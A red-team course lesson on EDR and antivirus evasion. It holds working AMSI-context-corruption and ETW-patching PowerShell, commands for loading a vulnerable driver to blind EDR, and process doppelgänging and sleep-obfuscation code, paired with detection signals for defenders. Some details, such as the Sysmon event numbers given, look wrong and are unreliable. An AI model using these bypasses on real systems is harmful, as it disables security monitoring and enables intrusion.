---
title: "Advanced Evasion and AV/EDR Bypass — Modern Tradecraft"
tags: [red-team, evasion, AV-bypass, EDR-bypass, syscalls, BYOVD, AMSI, sleep-obfuscation,
  process-injection, ATT&CK, T1562.001, T1055, T1027]
module: 08-RedTeam-03
day: 519
related_topics:
  - Living-Off-The-Land in AD (Day 518)
  - Practice Engagement Checkpoint (Day 520)
  - AV and EDR Evasion Concepts (Day 494)
  - Post-Exploitation Advanced (Day 497)
---

# Day 519 — Advanced Evasion and AV/EDR Bypass

> "Day 494 taught you the concepts. Today we go deeper — to the techniques that
> bypass an EDR that has already been hardened against the basics. AMSI patching,
> direct syscalls, sleep obfuscation, and PPL bypass via a vulnerable driver.
> These are not CTF tricks. These are the techniques in active APT toolkits.
> Know them so you can detect them."
>
> — Ghost

---

## Goals

Understand and apply indirect syscalls to bypass user-mode EDR hooks.
Understand BYOVD (Bring Your Own Vulnerable Driver) for PPL process protection bypass.
Implement sleep obfuscation to evade memory scanning during beacon sleep cycles.
Apply heap encryption and AMSI bypass in a controlled lab beacon.
Map each evasion technique to its detection signal so the blue team understands
what to look for.

**Prerequisites:** Day 494 (AV/EDR evasion concepts), Day 497 (post-exploitation),
Day 518 (LOLAD), x86/x64 assembly basics.
**Time budget:** 6 hours.

---

## Part 1 — The Modern EDR Threat Model

```
Standard EDR hooks (user-mode):
  1. EDR injects a DLL into every new process (via CreateRemoteThread or APC)
  2. The EDR DLL patches the first instructions of sensitive ntdll.dll functions:
       NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory,
       NtCreateThread, NtProtectVirtualMemory, NtReadVirtualMemory
  3. Instead of executing the syscall stub, execution jumps to the EDR's
     analysis code before the kernel transition
  4. The EDR inspects call stack, memory regions, parameters
  5. If suspicious: block, log, or alert

What this means for the attacker:
  → Any Mimikatz, SharpHound, or Cobalt Strike that calls ntdll directly
    will be inspected by the EDR before the syscall reaches the kernel
  → The hook is in USER SPACE — it is patchable, bypassable, and avoidable
  → The kernel itself cannot be hooked from user-mode (kernel callbacks exist
    but are separate — see Part 5)

Bypass categories:
  A. Direct syscalls:     call the kernel directly, bypassing ntdll hooks
  B. Indirect syscalls:   use ntdll stubs for SSN lookup, call via trampoline
  C. Module stomping:     load a clean ntdll from disk, use unhooking calls
  D. BYOVD:              load a vulnerable kernel driver, operate at ring-0
  E. Sleep obfuscation:  encrypt beacon in memory during sleep to defeat
                          memory scanning
  F: AMSI bypass:        patch AMSI buffer in memory to return E_FAIL
```

---

## Part 2 — Direct and Indirect Syscalls

### Why Direct Syscalls Work

```
Normal call chain (hooked):
  Beacon → ntdll.NtOpenProcess (patched by EDR) → EDR analysis → syscall → kernel

Direct syscall (bypasses hook):
  Beacon → custom asm stub with MOV EAX, SSN + SYSCALL → kernel directly
  EDR hook in ntdll is never executed

Problem with direct syscalls:
  The call stack shows the syscall originating from YOUR shellcode/module
  → Not from ntdll
  → Modern EDRs check call stack origin: syscall from a non-ntdll address = alert
  → CrowdStrike Falcon detects "unsupported call stack" events since ~2022

Indirect syscall (better):
  Execute the SYSCALL instruction from inside ntdll's own memory
  Call stack shows ntdll as the source of the syscall
  → Passes call stack validation
  → More expensive to detect
```

### SysWhispers3 — Indirect Syscall Implementation

```c
// SysWhispers3 generates stub code for indirect syscalls
// The generated stub:
// 1. Resolves the SSN (System Service Number) dynamically from ntdll at runtime
// 2. Sets up the call to point back into ntdll for the SYSCALL instruction
// 3. The actual SYSCALL fires from within ntdll's address space

// Generated stub concept (simplified x64 asm):
// SW3_NtOpenProcess:
//     mov [rsp+8], rcx             ; save parameters
//     mov rax, [NtOpenProcess_SSN] ; load system service number dynamically
//     jmp qword [ntdll_syscall_addr]; jump into ntdll to execute SYSCALL
//     ; execution continues in kernel, returns to caller via ntdll

// Usage in C (after SysWhispers3 generation):
HANDLE hProcess;
OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
CLIENT_ID cid = { (HANDLE)targetPid, NULL };
SW3_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
// → EDR sees syscall from ntdll.dll address range → passes call stack check
```

### SSN Resolution Strategies

```c
// Strategy 1: Sort-and-count (SysWhispers2 classic)
// Sort all Nt* exports by address; position in sorted list = SSN
// Problem: hooked functions have different addresses (EDR patches first bytes)
// → Sort by address of unhooked stubs → still works if ntdll is partially hooked

// Strategy 2: Exception-based (Hell's Gate variant)
// Use a structured exception to trigger an exception handler that reads the SSN
// from the exception context record
// → Works even when stubs are hooked (reads SSN before the hook executes)

// Strategy 3: Egg-hunting (find the syscall stub pattern in ntdll)
// Search ntdll bytes for: 4C 8B D1 B8 ?? ?? 00 00 (mov eax, SSN pattern)
// Extract SSN from the matched bytes
// Works on clean ntdll and most partially-hooked environments

// In a real engagement: use SysWhispers3 + indirect trampoline + egg-hunting
// as the SSN resolution method. Most modern C2 frameworks support this via
// BOFs (Beacon Object Files) or built-in indirect syscall mode.
```

---

## Part 3 — BYOVD: Bring Your Own Vulnerable Driver

### What BYOVD Is

```
Problem: PPL (Protected Process Light) protects processes like:
  → Windows Defender (MsMpEng.exe)
  → Antimalware services
  → LSASS (when RunAsPPL = 1)

PPL prevents:
  → Other processes from opening them with PROCESS_VM_READ / PROCESS_VM_WRITE
  → Even SYSTEM-level processes cannot read PPL process memory

BYOVD approach:
  1. Load a legitimate, signed kernel driver that has a known vulnerability
  2. The driver runs at ring-0 (kernel level) — above any user-mode protection
  3. Use the driver's vulnerability to execute arbitrary kernel code
  4. From kernel: kill EDR processes, disable PPL, or read LSASS from kernel

Why it works:
  Windows requires kernel drivers to be signed (KMCS)
  But there are thousands of old, legitimate, signed drivers with kernel bugs
  Windows cannot retroactively revoke trust for all of them (HVCI solves this)
```

### EDRSandblast — BYOVD for EDR Disable

```bash
# EDRSandblast uses the RTCore64.sys driver (MSI Afterburner)
# RTCore64.sys allows arbitrary kernel memory read/write via IOCTL

# Step 1: Load the vulnerable driver
sc.exe create RTCore64 type= kernel start= demand \
    binpath= "C:\Windows\Temp\RTCore64.sys"
sc.exe start RTCore64

# Step 2: EDRSandblast uses the driver to:
#   → Find the EDR's kernel callbacks (PsSetCreateProcessNotifyRoutine)
#   → Patch the callback pointers to NULL (unregister the EDR's hooks)
#   → Enumerate kernel object table to find EDR process
#   → Directly modify the EPROCESS structure to remove EDR kernel protection

EDRSandblast.exe --kernelmode
# → EDR kernel callbacks removed; EDR user-mode hooks still present but blind
# → Optionally: dump LSASS via NtReadVirtualMemory with PPL bypassed

# Alternative vulnerable drivers (all legitimate, all abused in the wild):
#   gdrv.sys        — Gigabyte driver (CVE abuse)
#   procexp152.sys  — Sysinternals Process Explorer (WHQL signed)
#   WinRing0x64.sys — HWiNFO / OpenHardwareMonitor (read-write IOCTL)
#   mhyprot2.sys    — Genshin Impact anti-cheat (widely abused in ransomware)
```

### Detection: BYOVD

```
Detection signals:
  1. Sysmon Event 6: Driver loaded
     → ImageLoaded: path to a known-vulnerable driver
     → Use a BYOVD driver blocklist (LOLDRIVERS.io maintains this list)

  2. Event 7045: Service installed
     → ServiceFileName matching a .sys extension from a non-standard path
     → ServiceType: kernel (value 1)

  3. Microsoft Vulnerable Driver Blocklist (HVCI):
     → Enable Hypervisor-Protected Code Integrity (HVCI) / Memory Integrity
     → Blocks loading of known-vulnerable drivers entirely
     → This is the single most effective defence against BYOVD

  4. LOLDrivers Sigma rule (maintained community list):
     Sysmon EventID: 6
     Hashes|contains:
       - '01AA9AC7B77CD56B264006EB64AB5EDE'  # RTCore64
       - 'B2F955B3E6107F831EBE67997F8586D4'  # mhyprot2
     # Full list: loldrivers.io/drivers
```

---

## Part 4 — Sleep Obfuscation

### The Memory Scanning Problem

```
Modern EDRs scan process memory for known signatures and suspicious
memory characteristics during execution AND during idle periods.

Memory indicators that trigger EDR:
  → Executable memory regions not backed by a file on disk (private RX memory)
  → Shellcode headers (MZ/PE headers in shellcode-allocated regions)
  → Known shellcode byte patterns in allocated memory
  → RWX memory regions (allocated with all three: readable, writable, executable)

Beacon sleep window:
  Between tasking callbacks, the beacon sleeps (e.g. 60 seconds)
  During sleep: the beacon's shellcode sits in memory, unencrypted
  → Periodic memory scans can find the shellcode signature during this window

Sleep obfuscation goal:
  Encrypt the beacon's own shellcode in memory BEFORE sleeping
  Decrypt it AFTER waking, before executing the next task
  → During the sleep window: memory contains encrypted data, not shellcode
  → No signature, no pattern → scanner finds nothing
```

### Ekko Sleep Obfuscation

```c
// Ekko (by @5pider) — uses APC-based ROP chain for sleep obfuscation
// Key insight: use Windows thread pool timers + ROP to:
//   1. Encrypt beacon shellcode (XOR or ChaCha20)
//   2. Change memory protection: RX → RW
//   3. Sleep for the jitter interval
//   4. Change protection back: RW → RX
//   5. Decrypt shellcode
//   6. Resume execution

// Simplified concept:
void EkkoSleep(DWORD sleepMs) {
    HANDLE timerQueue = CreateTimerQueue();
    HANDLE timer1, timer2, timer3, timer4;

    // Timer 1: encrypt the beacon image in memory (XOR with random key)
    CreateTimerQueueTimer(&timer1, timerQueue, EncryptCallback, &ctx, 0, 0, 0);

    // Timer 2: change protection to RW (no execute during sleep)
    CreateTimerQueueTimer(&timer2, timerQueue, ChangeProtCallback, &ctx, 100, 0, 0);

    // Timer 3: actual WaitForSingleObject sleep
    CreateTimerQueueTimer(&timer3, timerQueue, SleepCallback, &ctx, 200, 0, 0);

    // Timer 4: decrypt + restore RX on wake
    CreateTimerQueueTimer(&timer4, timerQueue, DecryptRestoreCallback, &ctx, sleepMs, 0, 0);

    WaitForSingleObject(event, INFINITE);
    DeleteTimerQueue(timerQueue);
}

// During the sleep window:
//   → Memory region is RW (not executable)
//   → Contents are XOR-encrypted (no beacon signature)
//   → EDR memory scanner finds: RW region with encrypted noise
//   → No alert
```

### Foliage — Heap Encryption

```c
// Foliage extends sleep obfuscation to the heap
// Problem: Ekko encrypts the text section but not heap allocations
// Cobalt Strike beacon stores C2 configuration, task data on the heap
// These heap regions can still be scanned and detected

// Foliage approach:
//   1. Walk the process heap (HeapWalk API)
//   2. XOR-encrypt every allocated heap chunk before sleep
//   3. Decrypt on wake
//   4. Combine with Ekko text section encryption for full memory obfuscation

// Heap encryption pseudocode:
PROCESS_HEAP_ENTRY entry = { NULL };
HANDLE hHeap = GetProcessHeap();
while (HeapWalk(hHeap, &entry)) {
    if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
        XorMemory(entry.lpData, entry.cbData, encryptionKey);
    }
}
// Sleep with Ekko text obfuscation
// Decrypt heap on wake in reverse order
```

---

## Part 5 — Advanced AMSI Bypass

### AMSI Architecture Review

```
AMSI (Antimalware Scan Interface):
  → amsi.dll is loaded into every PowerShell, .NET, JScript host process
  → AmsiScanBuffer() is called with every script content before execution
  → If the scan returns AMSI_RESULT_DETECTED → execution blocked

Classic bypass (patched heavily by EDRs):
  → Patch AmsiScanBuffer to return 0x80070057 (E_INVALIDARG) immediately
  → Modern EDR detects: write to amsi.dll memory by non-AMSI code = alert

Current bypass categories:
  1. AmsiScanBuffer patching (detected, but new variants work)
  2. AmsiOpenSession nullification (different hook point)
  3. amsi.dll unloading (causes CrashOnUnhandledException)
  4. Context corruption (corrupt the AMSI context pointer)
  5. CLR-level bypass (.NET reflection to access internal AMSI calls)
```

### Context Corruption AMSI Bypass

```powershell
# Corrupt the AMSI context pointer — forces AMSI_RESULT_NOT_DETECTED
# This works because AmsiScanBuffer validates the context pointer;
# a corrupted pointer causes the function to return early (not detected)

$a = [Ref].Assembly.GetTypes()
ForEach ($b in $a) {
    if ($b.Name -like "*AmsiUtils*") {
        $c = $b
    }
}
$d = $c.GetFields('NonPublic,Static')
ForEach ($e in $d) {
    if ($e.Name -like "*Context*") {
        $e.SetValue($null, [IntPtr]0x41424344)  # corrupt the context pointer
    }
}
# → AmsiScanBuffer now sees an invalid context → returns NOT_DETECTED
# → Subsequent PowerShell commands are not scanned
```

### ETW (Event Tracing for Windows) Bypass

```powershell
# AMSI can still log to ETW even if the scan result is bypassed
# ETW bypass: patch EtwEventWrite in ntdll to return immediately
# This prevents EDR from receiving ETW events from this process

$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Get-ProcAddress ntdll.dll EtwEventWrite),
    (Get-DelegateType @() ([Void]))
)

# Patch EtwEventWrite first instruction to RET (0xC3):
$oldProtect = [UInt32]0
[Win32]::VirtualProtect($ntdll, [UInt32]1, [UInt32]0x40, [Ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::WriteByte($ntdll, 0xC3)
[Win32]::VirtualProtect($ntdll, [UInt32]1, $oldProtect, [Ref]$oldProtect)

# → ETW events from this process are silenced
# → Combined with AMSI bypass: no scan results, no telemetry
# NOTE: patching ntdll memory is visible to EDR via Sysmon Event 25
# (ProcessTampering) — increasingly detected
```

---

## Part 6 — Process Injection: Modern Variants

### Process Doppelgänging

```c
// Process Doppelgänging (Hasherezade, 2017 — still relevant in 2024)
// Uses NTFS Transactions to create a transacted file, write shellcode,
// create a process from the transacted file, then roll back the transaction.
// The process starts from a "ghost" file that does not exist on disk.

// Key calls (simplified):
HANDLE hTx = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
HANDLE hFile = CreateFileTransacted(L"C:\\Windows\\System32\\svchost.exe",
    GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, NULL, hTx, NULL, NULL);

// Overwrite the transacted svchost.exe with shellcode
WriteFile(hFile, shellcode, shellcodeSize, &written, NULL);

// Create a section from the modified transacted file
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
    PAGE_READONLY, SEC_IMAGE, hFile);

// Roll back the transaction (the written data is never committed to disk)
RollbackTransaction(hTx);

// Create the process from the section — it maps the modified (shellcode) version
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
    GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);

// Result: a process running shellcode, mapped as svchost.exe by the OS
// AV scanning the file on disk sees the real svchost.exe
```

### Phantom DLL Hollowing

```c
// Phantom DLL Hollowing (combines DLL hollowing + Transacted sections)
// 1. Find a DLL that is never loaded in the target process
// 2. Create a transacted copy of that DLL, overwrite with shellcode
// 3. Map the transacted section into the target process as a RX region
// 4. Queue an APC to the target thread pointing to the mapped region
// 5. Roll back the transaction

// Advantage over classic process hollowing:
//   → The mapped region appears to be backed by a legitimate DLL path
//   → Memory scanners see: RX region backed by C:\Windows\System32\legit.dll
//   → No "unbacked executable region" alert
//   → The actual content (shellcode) is not visible on disk

// Detection:
//   → NtCreateSection with SEC_IMAGE from a transacted file creates a
//     specific kernel-level trace — few legitimate applications use this path
//   → Sysmon Event 8 (CreateRemoteThread) or APC injection events
//   → Kernel ETW provider: Microsoft-Windows-Kernel-Process — unusual
//     process-to-process memory operations
```

---

## Part 7 — Detection Matrix

| Technique | EDR Signal | Sigma/Detection approach |
|---|---|---|
| Direct syscall | Syscall from non-ntdll address in call stack | CrowdStrike "unsupported call stack" alert |
| Indirect syscall | Minimal signal; call stack shows ntdll | SSN resolution pattern (egg-hunt) in memory |
| BYOVD | Sysmon Event 6 (driver load); Event 7045 | LOLDRIVERS hash blocklist; HVCI |
| Sleep obfuscation (Ekko) | Memory region: RW non-image during sleep | Memory scanner periodic scan; region transitions RX→RW→RX |
| Heap encryption (Foliage) | Heap walk + write patterns | Heap region XOR key search; anomalous HeapWalk call count |
| AMSI context corruption | amsi.dll memory write from non-amsi source | Sysmon Event 10 or CLD memory write rule |
| ETW patching | ntdll.EtwEventWrite modification | Sysmon Event 25 (ProcessTampering) |
| Process Doppelgänging | NtCreateSection from transacted file | ETW kernel provider; file system minifilter |
| Phantom DLL Hollowing | SEC_IMAGE section from unexpected path | Kernel ETW; memory forensics (Volatility malfind) |

---

## Key Takeaways

1. Modern EDR evasion is an arms race at the user-mode/kernel boundary. Indirect
   syscalls move the detection problem from "which function was called" to "what
   is the call stack origin." The next generation of EDRs validates the entire
   call stack — not just the syscall instruction.
2. BYOVD is the most powerful bypass available without zero-days because it
   escalates from user-mode to ring-0. HVCI (Memory Integrity) blocks it
   entirely. The most impactful defensive action any Windows environment can take
   is to enable HVCI and the Microsoft Vulnerable Driver Blocklist.
3. Sleep obfuscation defeats periodic memory scanning but not real-time
   monitoring. An EDR that monitors memory region protection transitions
   (RX → RW → RX in rapid succession) will catch Ekko-style sleep obfuscation
   as an anomaly even if the decrypted content is never visible.
4. AMSI bypass techniques that patch ntdll or amsi.dll memory are increasingly
   caught via Sysmon Event 25 (ProcessTampering) and CLD (Code Integrity Guard)
   enforcement. The most durable bypasses operate at the CLR reflection layer
   rather than patching DLL memory.
5. Process Doppelgänging and Phantom DLL Hollowing defeat file-based AV scanning
   but leave kernel-level traces that endpoint forensics (Volatility, memory
   acquisition) will find. They are not forensics-proof — they are scan-proof.

---

## Exercises

1. Set up a lab Windows 11 VM with Windows Defender enabled. Use SysWhispers3 to
   generate a NtOpenProcess indirect syscall stub. Write a small C program that
   opens LSASS using the indirect syscall. Verify it works and compare Sysmon
   Event 10 logs vs a direct `OpenProcess` call. What differs in the call stack?
2. Enable Sysmon Event 6 (driver load) logging. Load the `WinRing0x64.sys` driver
   in the lab (from a legitimate tool). Verify the event fires. Then write a
   Sigma rule that checks the loaded driver's hash against the top 10 LOLDRIVERS
   entries. Test it.
3. Implement a minimal Ekko-style sleep: write a PowerShell script that
   XOR-encrypts a byte array, changes its memory protection to RW, sleeps for
   10 seconds, then changes protection back to RX and XOR-decrypts. Verify via
   Sysmon Event 13 (MemoryProtection change) that the RX→RW→RX transition is
   logged.
4. Use the AMSI context corruption bypass from Part 5 in a lab PowerShell session.
   Verify that EICAR-equivalent test strings are no longer blocked. Enable Windows
   Defender logging and identify which Windows event (if any) records the failed
   AMSI scan. Research whether the context corruption method is detected by Windows
   Defender by 2025 patch level.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q519.1, Q519.2 …).

---

## Navigation

← Previous: [Day 518 — Living-Off-The-Land in AD](DAY-0518-LOLAD-Living-Off-The-Land.md)
→ Next: [Day 520 — Practice Engagement Checkpoint](DAY-0520-Practice-Engagement-Checkpoint.md)
